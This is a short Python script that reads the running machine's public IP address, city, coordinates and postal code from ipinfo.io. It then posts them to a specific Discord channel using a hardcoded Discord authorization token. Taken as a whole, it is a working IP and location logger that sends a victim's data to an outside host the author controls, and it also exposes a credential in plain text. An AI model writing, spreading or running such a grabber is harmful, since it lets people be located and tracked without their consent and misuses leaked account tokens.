
import requests,json

def getData():
    url = "https://ipinfo.io/json"
    response = requests.get(url=url)
    return response.json()


def main():
    url = "https://discord.com/api/v9/channels/1160642283775987795/messages"

    response = getData()

    ip = response['ip']
    city = response['city']
    loc = response['loc']
    postal = response['postal']

    payload = f"ip={ip} , city={city}, loc={loc}, postal={postal}"

    data = {
        "content": payload
    }

    data = json.dumps(data)

    headers = {
        "Authorization": "OTUxNDkyMTI1MDA5MjU2NDU4.GJGjUx.j06IQsI-q4QLxYlt5mY18DZubgR5lQsAXAIUGs",
        "Content-Type": "application/json"
    }

    print(data)
    res = requests.post(url=url, data=data, headers=headers)

    print(res.status_code)

if __name__ == "__main__":
    main()